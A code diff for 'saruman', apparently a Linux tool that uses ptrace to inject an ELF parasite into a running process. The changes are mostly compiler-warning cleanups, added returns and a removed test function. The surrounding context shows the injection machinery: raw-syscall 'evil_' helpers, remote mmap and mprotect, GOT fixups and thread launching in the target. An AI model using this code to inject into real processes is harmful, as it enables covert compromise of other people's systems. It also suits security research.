@@ -4,9 +4,15 @@
  */
 
 #include "saruman.h"
+#include <alloca.h>
+#include <assert.h>
+#include <sys/mman.h>
+#include <sys/time.h>
+#include <sys/wait.h>
 
 #define STACK_TOP(x) (x - STACK_SIZE)
-#define __BREAKPOINT__ __asm__ __volatile__("int3"); 
+#define __UNREACHABLE__ __builtin_unreachable()
+#define __BREAKPOINT__ __asm__ __volatile__("int3"); __UNREACHABLE__;
 #define __RETURN_VALUE__(x) __asm__ __volatile__("mov %0, %%rax\n" :: "g"(x))
 
 #define MAX_PATH 512
@@ -27,7 +33,6 @@
  __PAYLOAD_KEYWORDS__ void * evil_mmap(void *, unsigned long, unsigned long, unsigned long, long, unsigned long) __PAYLOAD_ATTRIBUTES__;
  __PAYLOAD_KEYWORDS__ uint64_t bootstrap_code(void *, uint64_t, void *) 	  __PAYLOAD_ATTRIBUTES__;
  __PAYLOAD_KEYWORDS__ long evil_open(const char *, unsigned long) 		  __PAYLOAD_ATTRIBUTES__;
- __PAYLOAD_KEYWORDS__ int evil_fstat(long, struct stat *) 			  __PAYLOAD_ATTRIBUTES__;
  __PAYLOAD_KEYWORDS__ long evil_lseek(long, long, unsigned int)			  __PAYLOAD_ATTRIBUTES__;
  __PAYLOAD_KEYWORDS__ int evil_read(long, char *, unsigned long)		  __PAYLOAD_ATTRIBUTES__;
  __PAYLOAD_KEYWORDS__ size_t evil_write(long, void *, unsigned long)		  __PAYLOAD_ATTRIBUTES__;
@@ -172,7 +177,7 @@ __PAYLOAD_KEYWORDS__ int load_exec(const char *path,
 			  	   uint64_t dataSize,
 				   uint64_t dataOffset)
 {
-	uint64_t map_addr, brk_addr;
+	uint64_t brk_addr;
 	uint32_t off;
 	uint8_t *data;
 	volatile void *m1, *m2;
@@ -188,7 +193,7 @@ __PAYLOAD_KEYWORDS__ int load_exec(const char *path,
 	/*
 	 * Read in text segment to m1
 	 */	
-	evil_read(fd, (uint8_t *)m1, textSize);
+	evil_read(fd, (char *)m1, textSize);
 
 	m2 = evil_mmap((void *)PAGE_ALIGN(dataVaddr),
 			PAGE_ROUND(dataSize) + PAGE_SIZE,
@@ -209,7 +214,7 @@ __PAYLOAD_KEYWORDS__ int load_exec(const char *path,
 	/*
 	 * Read in data segment to m2
 	 */
-	evil_read(fd, data, dataSize);
+	evil_read(fd, (char *)data, dataSize);
 	
 	brk_addr = PAGE_ALIGN(dataVaddr) + dataSize;
 	evil_brk((void *)PAGE_ROUND(brk_addr));
@@ -262,7 +267,6 @@ __PAYLOAD_KEYWORDS__ void * evil_mmap(void *addr, unsigned long len, unsigned lo
 {
         long mmap_fd = fd;
         unsigned long mmap_off = off;
-        unsigned long mmap_flags = flags;
         unsigned long ret;
 
         __asm__ volatile(
@@ -307,20 +311,6 @@ __PAYLOAD_KEYWORDS__ long evil_ptrace(long request, long pid, void *addr, void *
         asm("mov %%rax, %0" : "=r"(ret));
         
         return ret;
-}
-
-__PAYLOAD_KEYWORDS__ int evil_fstat(long fd, struct stat *buf)
-{
-	long ret;
-	
-	__asm__ volatile(
-			"mov %0, %%rdi\n"
-			"mov %1, %%rsi\n"
-			"mov $5, %%rax\n"
-			"syscall" : : "g"(fd), "g"(buf));
-	asm("mov %%rax, %0" : "=r"(ret));
-	
-	return ret;
 }
 
 __PAYLOAD_KEYWORDS__ int create_thread(void (*fn)(void *), void *data, unsigned long stack)
@@ -369,7 +359,7 @@ __PAYLOAD_KEYWORDS__ int evil_mprotect(void * addr, unsigned long len, int prot)
                         "syscall" : : "g"(addr), "g"(len), "g"(prot));
      
         __asm__ volatile("mov %%rax, %0" : "=r"(ret));
- 	
+        __UNREACHABLE__;
 }
 
 __PAYLOAD_KEYWORDS__ int SYS_mprotect(void *addr, unsigned long len, int prot)
@@ -451,6 +441,18 @@ int restore_regs_struct(handle_t *h)
 	return 0;
 }
 
+int pid_detach_direct(pid_t pid)
+{
+	if (ptrace(PTRACE_DETACH, pid, NULL, NULL) < 0) {
+		if (errno) {
+			fprintf(stderr, "ptrace: pid_detach() failed: %s\n", strerror(errno));
+			return -1;
+		}
+	}
+	printf("[+] PT_TID_DETACHED -> %d\n", pid);
+	return 0;
+}
+
 int pid_attach_direct(pid_t pid)
 {
         int status;
@@ -485,18 +487,6 @@ detach:
         return -1;
 }
 
-int pid_detach_direct(pid_t pid)
-{
-	if (ptrace(PTRACE_DETACH, pid, NULL, NULL) < 0) {
-		if (errno) {
-			fprintf(stderr, "ptrace: pid_detach() failed: %s\n", strerror(errno));
-			return -1;
-		}
-	}
-	printf("[+] PT_TID_DETACHED -> %d\n", pid);
-	return 0;
-}
-
 int pid_detach(handle_t *h)
 {
 	pid_t pid = h->tasks.pid;
@@ -517,9 +507,8 @@ int pid_detach_stateful(handle_t *h)
 		return 0;
 	if (pid_detach(h) < 0)
 		return -1;
+	return 0;
 }
-
-	
 		
 int pid_attach(handle_t *h)
 {
@@ -564,6 +553,7 @@ int pid_attach_stateful(handle_t *h)
 	if (pid_attach(h) < 0)
 		return -1;
 
+	return 0;
 }
 
 int pid_read(int pid, void *dst, const void *src, size_t len)
@@ -754,7 +744,6 @@ int call_fn(functionPayloads_t func, handle_t *h, uint64_t ip)
 
 int pt_memset(handle_t *h, void *target, size_t len)
 {
-        size_t i;
         int sz = len / sizeof(void *);
         uint64_t null = 0UL;
         uint8_t *s = (uint8_t *)&null;
@@ -774,8 +763,6 @@ int pt_memset(handle_t *h, void *target, size_t len)
 
 int pt_mprotect(handle_t *h, void *addr, size_t len, int prot)
 {
-	struct user_regs_struct pt_reg;
-
 	h->payloads.function[SYS_MPROTECT].args[0] = addr; //addr;
 	h->payloads.function[SYS_MPROTECT].args[1] = (void *)(uintptr_t)len;
 	h->payloads.function[SYS_MPROTECT].args[2] = (void *)(uintptr_t)prot;
@@ -791,8 +778,6 @@ int pt_mprotect(handle_t *h, void *addr, size_t len, int prot)
 
 int pt_create_thread(handle_t *h, void (*fn)(void *), void *data, uint64_t stack)
 {
-	struct user_regs_struct pt_reg;
-	
 	h->payloads.function[CREATE_THREAD].args[0] = (void *)fn;
 	h->payloads.function[CREATE_THREAD].args[1] = data;
 	h->payloads.function[CREATE_THREAD].args[2] = (void *)(uint64_t)stack;
@@ -809,8 +794,6 @@ int pt_create_thread(handle_t *h, void (*fn)(void *), void *data, uint64_t stack
 
 static int dlopen_launch_parasite(handle_t *h)
 {
-	struct user_regs_struct tid_regs;
-	int status;
 	void (*entry)(void *) = (void *)h->entryp;
 	tid_t tid;
 	DBG_MSG("[+] Entry point: %p\n", entry);
@@ -840,8 +823,6 @@ static int dlopen_launch_parasite(handle_t *h)
 
 static int launch_parasite(handle_t *h)
 {
-	struct user_regs_struct tid_regs;
-	int status;
 	void (*entry)(void *) = (void (*)(void *))(h->entryp + h->base);
 	tid_t tid;
 
@@ -870,42 +851,9 @@ static int launch_parasite(handle_t *h)
 	
 }
 
-/*
- * XXX This function was only to test the parasite before
- * thread injection was working (Which it is now)
- */
-static int launch_parasite_no_thread(handle_t *h)
-{
-        struct user_regs_struct pt_reg = {0};
-        int status;
-        void *stackframe;
-	long null = 0L;
-
-        if (pid_attach_stateful(h) < 0)
-                return -1;
-
-	pt_memset(h, (void *)STACK_TOP(h->stack.base), STACK_SIZE);
-        
-	h->pt_reg.rip = (uint64_t)h->entryp + h->base;
-        h->pt_reg.rsp = (uint64_t)h->stack.base;
-	
-        if (ptrace(PTRACE_SETREGS, h->tasks.pid, NULL, &h->pt_reg) < 0) {
-                perror("PTRACE_SETREGS");
-                return -1;
-        }
-	
-        return 0;
-}
-
 int run_exec_loader_dlopen(handle_t *h)
 {
-	size_t codesize;
-        void *mapped;
-        struct user_regs_struct pt_reg;
-        int i;
-        char buf[4096];
-        char tmp[32], tmp2[32];
-        struct linking_info *linfo = h->linfo;
+        char tmp[32];
 	void *ascii_storage = (void *)((unsigned long)h->stack.base - 512);
 
 	if (pid_attach_stateful(h) < 0)
@@ -939,13 +887,7 @@ int run_exec_loader_dlopen(handle_t *h)
 
 int run_exec_loader(handle_t *h)
 {
-	size_t codesize;
-	void *mapped;
-	struct user_regs_struct pt_reg;
-	int i;
-	char buf[4096];
 	char tmp[32];
-	struct linking_info *linfo = h->linfo;
 	void *ascii_storage = (void *)((unsigned long)h->stack.base - 512);
 
 	
@@ -991,15 +933,12 @@ int run_exec_loader(handle_t *h)
  */
 int run_bootstrap(handle_t *h)
 {
-	struct user_regs_struct pt_reg, pt_reg_orig;
 	char maps[MAX_PATH - 1], line[256], tmp[32];
 	char *p, *start;
 	uint8_t *origcode;
 	FILE *fd;
-	Elf64_Ehdr *ehdr;
-	Elf64_Phdr *phdr;
 	uint32_t codesize;
-	int i, status, ret;
+	int i;
 	
 	
 	snprintf(maps, MAX_PATH - 1, "/proc/%d/maps", h->tasks.pid);
@@ -1083,13 +1022,13 @@ Elf64_Addr randomize_base(void)
 	
 	struct timeval tv;
 	
-	gettimeofday(&tv);
+	gettimeofday(&tv, NULL);
 	srand(tv.tv_usec); 
 	
 	b = rand() % 0xF;
 	b <<= 24;
 	
-	gettimeofday(&tv);
+	gettimeofday(&tv, NULL);
 	srand(tv.tv_usec);
 
         v = PAGE_ALIGN(b + (rand() & 0x0000ffff));
@@ -1105,9 +1044,7 @@ int map_elf_binary(handle_t *h,  const char *path)
 	Elf64_Ehdr *ehdr;
 	Elf64_Phdr *phdr;
 	Elf64_Shdr *shdr;
-	Elf64_Sym  *sym;
 	Elf64_Dyn *dyn;
-	char *StringTable;
 	
 	if ((fd = open(path, O_RDWR)) < 0) {
 		perror("open");
@@ -1147,20 +1084,17 @@ int map_elf_binary(handle_t *h,  const char *path)
 	for (i = 0; i < ehdr->e_phnum; i++) {
 		switch(phdr[i].p_type) {		
 			case PT_LOAD:
-				switch (!(!(phdr[i].p_offset))) {
-					case 0:
+				if (!(!(phdr[i].p_offset))) {
 						printf("[+] Found text segment\n");
 						h->textVaddr = phdr[i].p_vaddr;
 						h->textOff = phdr[i].p_offset;
 						h->textSize = phdr[i].p_memsz;
-						break;
-					case 1:
+				} else {
 						printf("[+] Found data segment\n");
 						h->o_dataVaddr = h->dataVaddr = phdr[i].p_vaddr;
 						h->dataOff = phdr[i].p_offset;
 						h->dataSize = phdr[i].p_memsz;
 						h->datafilesz = phdr[i].p_filesz;
-						break;
 				} 
 				break;
 			case PT_DYNAMIC:
@@ -1281,16 +1215,18 @@ char * get_section_index(int section, uint8_t *target)
         
         for (i = 0; i < ehdr->e_shnum; i++) {
                 if (i == section)
-                        return (target + shdr[i].sh_offset);
+                        return (char*) (target + shdr[i].sh_offset);
         }
 
+		assert(0);
+		return NULL;
 }
 
 unsigned long get_libc_addr(int pid)
 {
         FILE *fd;
         char buf[255], file[255];
-        char *p, *q;
+        char *p;
         Elf64_Addr start, stop;
 
         snprintf(file, sizeof(file)-1, "/proc/%d/maps", pid);
@@ -1324,13 +1260,15 @@ unsigned long get_libc_addr(int pid)
                 }
         }
 
+		assert(0);
+		return 0;
 }
 
 Elf64_Addr get_sym_from_libc(handle_t *h, const char *name)
 {
-	int fd, i;
+	(void) h;
+	int fd;
 	struct stat st;
-	Elf64_Addr libc_base_addr = get_libc_addr(h->tasks.pid);
 	Elf64_Addr symaddr;
 	
 	if ((fd = open(globals.libc_path, O_RDONLY)) < 0) {
@@ -1369,8 +1307,7 @@ int fixup_got(handle_t *h)
 {
         int i, slot;
         struct linking_info *link;
-        Elf64_Addr got_sym_addr, symaddr;
-        Elf64_Addr libc_addr, tmp;
+        Elf64_Addr tmp;
         unsigned int libc_sym_addr;
         
         h->linfo = link = (struct linking_info *)(uintptr_t)get_reloc_data(h);
@@ -1420,9 +1357,9 @@ Elf64_Addr resolve_symbol(char *name, uint8_t *target)
 {
         Elf64_Sym *symtab;
         char *SymStrTable;
-        int i, j, symcount;
+        int i;
+        unsigned long j;
 
-        Elf64_Off strtab_off;
         Elf64_Ehdr *ehdr = (Elf64_Ehdr *)target;
         Elf64_Shdr *shdr = (Elf64_Shdr *)(target + ehdr->e_shoff);
 
@@ -1457,7 +1394,8 @@ struct linking_info *get_reloc_data(handle_t *target)
         Elf64_Ehdr *ehdr;
 
         char *symbol;
-        int i, j, symcount, k;
+        int i;
+        unsigned long j, k, symcount;
 
         struct linking_info *link;
 
@@ -1541,14 +1479,15 @@ struct linking_info *get_reloc_data(handle_t *target)
  */
 int apply_relocs(handle_t *h)
 { 
-	int i, j, k;
-	Elf64_Shdr *shdr, *targetShdr;
+	int i, k;
+	unsigned long j;
+	Elf64_Shdr *shdr;
 	Elf64_Rela *rel;
 	struct linking_info *linfo = h->linfo;
 	Elf64_Sym *symtab, *symbol;
-	Elf64_Addr targetAddr, symval;
+	Elf64_Addr symval;
 	Elf64_Addr *relocPtr;
-	int dynstr;
+	int dynstr = 0;
 	char *StringTable;
 		
 	for (shdr = h->shdr, i = 0; i < h->ehdr->e_shnum; i++)
@@ -1631,6 +1570,7 @@ int apply_relocs(handle_t *h)
 		}
 	}
 
+	return 0;
 }
 
 
